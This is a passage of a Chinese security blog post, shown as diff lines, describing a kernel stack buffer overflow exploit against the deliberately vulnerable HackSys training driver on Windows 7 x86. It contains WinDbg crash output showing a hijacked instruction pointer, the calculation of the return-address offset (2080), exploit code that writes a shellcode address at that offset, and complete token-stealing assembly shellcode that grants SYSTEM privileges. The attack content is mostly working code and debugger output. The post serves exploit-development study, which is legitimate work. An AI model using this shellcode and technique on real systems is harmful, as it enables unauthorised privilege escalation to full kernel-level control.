class="line"></span><br><span class="line">FOLLOWUP_IP: </span><br><span class="line">nt!IofCallDriver+<span class="number">63</span></span><br><span class="line"><span class="number">84288086</span> <span class="number">5</span>e              pop     esi</span><br><span class="line"></span><br><span class="line">FAILED_INSTRUCTION_ADDRESS: </span><br><span class="line">+d3d2faf0bc1dbfc</span><br><span class="line"><span class="number">61616161</span> ??              ???</span><br><span class="line"></span><br><span class="line">BUGCHECK_STR:  ACCESS_VIOLATION</span><br><span class="line"></span><br><span class="line">DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT</span><br><span class="line"></span><br><span class="line">CURRENT_IRQL:  <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LAST_CONTROL_TRANSFER:  <span class="keyword">from</span> <span class="number">6</span>d6d6d6d to <span class="number">61616161</span></span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">WARNING: Frame IP not <span class="keyword">in</span> any known <span class="keyword">module</span>. Following frames may be wrong.</span><br><span class="line"><span class="number">8</span>fe7badc <span class="number">6</span>d6d6d6d <span class="number">71717171</span> <span class="number">88</span>f5a5a0 <span class="number">88</span>f5a610 <span class="number">0x61616161</span></span><br><span class="line"><span class="number">8</span>fe7bafc <span class="number">84288086</span> <span class="number">86</span>b73030 <span class="number">88</span>f5a5a0 <span class="number">88</span>f5a5a0 <span class="number">0x6d6d6d6d</span></span><br><span class="line"><span class="number">8</span>fe7bb14 <span class="number">8447</span>ccb9 <span class="number">87</span>c50bc8 <span class="number">88</span>f5a5a0 <span class="number">88</span>f5a610 nt!IofCallDriver+<span class="number">0x63</span></span><br><span class="line"><span class="number">8</span>fe7bb34 <span class="number">8447</span>fea2 <span class="number">86</span>b73030 <span class="number">87</span>c50bc8 <span class="number">00000000</span> nt!IopSynchronousServiceTail+<span class="number">0x1f8</span></span><br><span class="line"><span class="number">8</span>fe7bbd0 <span class="number">844</span>c647c <span class="number">86</span>b73030 <span class="number">88</span>f5a5a0 <span class="number">00000000</span> nt!IopXxxControlFile+<span class="number">0x6aa</span></span><br><span class="line"><span class="number">8</span>fe7bc04 <span class="number">8428</span>ed26 <span class="number">0000001</span>c <span class="number">00000000</span> <span class="number">00000000</span> nt!NtDeviceIoControlFile+<span class="number">0x2a</span></span><br><span class="line"><span class="number">8</span>fe7bc04 <span class="number">77547024</span> <span class="number">0000001</span>c <span class="number">00000000</span> <span class="number">00000000</span> nt!KiSystemServicePostCall</span><br><span class="line"><span class="number">0020</span>f920 <span class="number">77545804</span> <span class="number">75779965</span> <span class="number">0000001</span>c <span class="number">00000000</span> ntdll!KiFastSystemCallRet</span><br><span class="line"><span class="number">0020</span>f924 <span class="number">75779965</span> <span class="number">0000001</span>c <span class="number">00000000</span> <span class="number">00000000</span> ntdll!NtDeviceIoControlFile+<span class="number">0xc</span></span><br><span class="line"><span class="number">0020</span>f984 <span class="number">765</span>cba7d <span class="number">0000001</span>c <span class="number">00222003</span> <span class="number">0051</span>a430 KERNELBASE!DeviceIoControl+<span class="number">0xe9</span></span><br><span class="line"><span class="number">0020</span>f9b0 <span class="number">003910</span>d7 <span class="number">0000001</span>c <span class="number">00222003</span> <span class="number">0051</span>a430 kernel32!DeviceIoControl+<span class="number">0x48</span></span><br><span class="line"><span class="number">0020</span>f9f0 <span class="number">003912</span>da <span class="number">00000001</span> <span class="number">00516</span>dd0 <span class="number">00519</span>d10 ConsoleApplication1+<span class="number">0x10d7</span></span><br><span class="line"><span class="number">0020</span>fa38 <span class="number">765</span>cee2c <span class="number">7</span>ffdf000 <span class="number">0020</span>fa84 <span class="number">7756393</span>e ConsoleApplication1+<span class="number">0x12da</span></span><br><span class="line"><span class="number">0020</span>fa44 <span class="number">7756393</span>e <span class="number">7</span>ffdf000 <span class="number">7751</span>f61c <span class="number">00000000</span> kernel32!BaseThreadInitThunk+<span class="number">0x12</span></span><br><span class="line"><span class="number">0020</span>fa84 <span class="number">77563911</span> <span class="number">00391357</span> <span class="number">7</span>ffdf000 <span class="number">00000000</span> ntdll!__RtlUserThreadStart+<span class="number">0x70</span></span><br><span class="line"><span class="number">0020</span>fa9c <span class="number">00000000</span> <span class="number">00391357</span> <span class="number">7</span>ffdf000 <span class="number">00000000</span> ntdll!_RtlUserThreadStart+<span class="number">0x1b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  kb</span><br><span class="line"></span><br><span class="line">SYMBOL_STACK_INDEX:  <span class="number">2</span></span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  nt!IofCallDriver+<span class="number">63</span></span><br><span class="line"></span><br><span class="line">FOLLOWUP_NAME:  MachineOwner</span><br><span class="line"></span><br><span class="line">MODULE_NAME: nt</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  ntkrpamp.exe</span><br><span class="line"></span><br><span class="line">DEBUG_FLR_IMAGE_TIMESTAMP:  <span class="number">54011</span>f7f</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  ACCESS_VIOLATION_BAD_IP_nt!IofCallDriver+<span class="number">63</span></span><br><span class="line"></span><br><span class="line">BUCKET_ID:  ACCESS_VIOLATION_BAD_IP_nt!IofCallDriver+<span class="number">63</span></span><br><span class="line"></span><br><span class="line">Followup: MachineOwner</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>
+
+<p>我们算一下，加入按0x61的偏移算的话，0x61-0x41 = 32<br>由于我上面的代码是一次+4的，所以这个就是偏移，所以最终是2048+32 = 2080</p>
+<p>其实因为buffer在ebp-0x81c处，0x81c=2076，在加4，因为ebp，那么返回地址就是2080</p>
+<p>修改我们发送的字符串</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">memset(UserBuffer, <span class="number">0x41</span>, UserBufferSize);</span><br><span class="line">UserBuffer[<span class="number">2080</span>] = (DWORD)&amp;TokenStealingShellcodeWin7 &amp; <span class="number">0x000000FF</span>;</span><br><span class="line">UserBuffer[<span class="number">2080</span> + <span class="number">1</span>] = ((DWORD)&amp;TokenStealingShellcodeWin7 &amp; <span class="number">0x0000FF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">UserBuffer[<span class="number">2080</span> + <span class="number">2</span>] = ((DWORD)&amp;TokenStealingShellcodeWin7 &amp; <span class="number">0x00FF0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">UserBuffer[<span class="number">2080</span> + <span class="number">3</span>] = ((DWORD)&amp;TokenStealingShellcodeWin7 &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>;</span><br></pre></td></tr></table></figure>
+
+<p>还有UserBufferSize改为2084，因为过长，溢出会覆盖一些栈上的变量，可能是TriggerStackOverflow函数上层的其他变量，导致执行失败</p>
+<p>再用一下别人的shellcode</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// Windows <span class="number">7</span> SP1 x86 Offsets</span><br><span class="line">#define KTHREAD_OFFSET    <span class="number">0x124</span>    // nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">#define EPROCESS_OFFSET   <span class="number">0x050</span>    // nt!_KTHREAD.ApcState.Process</span><br><span class="line">#define PID_OFFSET        <span class="number">0x0B4</span>    // nt!_EPROCESS.UniqueProcessId</span><br><span class="line">#define FLINK_OFFSET      <span class="number">0x0B8</span>    // nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">#define TOKEN_OFFSET      <span class="number">0x0F8</span>    // nt!_EPROCESS.Token</span><br><span class="line">#define SYSTEM_PID        <span class="number">0x004</span>    // SYSTEM Process PID</span><br><span class="line"></span><br><span class="line">VOID TokenStealingShellcodeWin7() &#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		<span class="comment">; initialize</span></span><br><span class="line">			<span class="keyword">pushad</span><span class="comment">; save registers state</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[KTHREAD_OFFSET]<span class="comment">; Get nt!_KPCR.PcrbData.CurrentThread</span></span><br><span class="line">			<span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + EPROCESS_OFFSET]<span class="comment">; Get nt!_KTHREAD.ApcState.Process</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span><span class="comment">; Copy current _EPROCESS structure</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span> + TOKEN_OFFSET]<span class="comment">; Copy current nt!_EPROCESS.Token</span></span><br><span class="line">			<span class="keyword">mov</span> <span class="built_in">edx</span>, SYSTEM_PID<span class="comment">; WIN 7 SP1 SYSTEM Process PID = 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">		SearchSystemPID:</span></span><br><span class="line">		<span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + FLINK_OFFSET]<span class="comment">; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span></span><br><span class="line">			<span class="keyword">sub</span> <span class="built_in">eax</span>, FLINK_OFFSET</span><br><span class="line">			<span class="keyword">cmp</span>[<span class="built_in">eax</span> + PID_OFFSET], <span class="built_in">edx</span><span class="comment">; Get nt!_EPROCESS.UniqueProcessId</span></span><br><span class="line">			<span class="keyword">jne</span> SearchSystemPID</span><br><span class="line"></span><br><span class="line">			<span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">eax</span> + TOKEN_OFFSET]<span class="comment">; Get SYSTEM process nt!_EPROCESS.Token</span></span><br><span class="line">			<span class="keyword">mov</span>[<span class="built_in">ecx</span> + TOKEN_OFFSET], <span class="built_in">edx</span><span class="comment">; Copy nt!_EPROCESS.Token of SYSTEM to current process</span></span><br><span class="line">			<span class="keyword">popad</span><span class="comment">; restore registers state</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">; recovery</span></span><br><span class="line">			<span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span><span class="comment">; Set NTSTATUS SUCCEESS</span></span><br><span class="line">			<span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">12</span><span class="comment">; fix the stack</span></span><br><span class="line">			<span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">			<span class="keyword">ret</span> <span class="number">8</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后就可以成功获取最高权限了</p>
+<p><img src="http://pic.giantbranch.cn/pic1503565542755.jpg" alt></p>
+<p>参考：<br><a href="https://sizzop.github.io/2016/07/05/kernel-hacking-with-hevd-part-1.html" target="_blank" rel="noopener">https://sizzop.github.io/2016/07/05/kernel-hacking-with-hevd-part-1.html</a><br><a href="http://www.fuzzysecurity.com/tutorials/expDev/14.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/expDev/14.html</a><br><a href="http://www.osronline.com/article.cfm?article=295" target="_blank" rel="noopener">http://www.osronline.com/article.cfm?article=295</a><br><a href="https://github.com/sam-b/HackSysDriverExploits/tree/master/HackSysDriverStackoverflowExploit" target="_blank" rel="noopener">https://github.com/sam-b/HackSysDriverExploits/tree/master/HackSysDriverStackoverflowExploit</a><br><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank" rel="noopener">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/" title="内核缓冲区溢出学习之第一个内核缓冲区溢出提权">https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内核漏洞/" rel="tag"># 内核漏洞</a>
+          
+            <a href="/tags/漏洞利用/" rel="tag"># 漏洞利用</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/22/从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式/" rel="next" title="从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式">
+                <i class="fa fa-chevron-left"></i> 从Exploit-Exercises Fusion Level02看linux绕过ASLR和NX的三种利用方式
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/" rel="prev" title="Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比">
+                Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/';
+          this.page.identifier = '2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/';
+          this.page.title = '内核缓冲区溢出学习之第一个内核缓冲区溢出提权';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
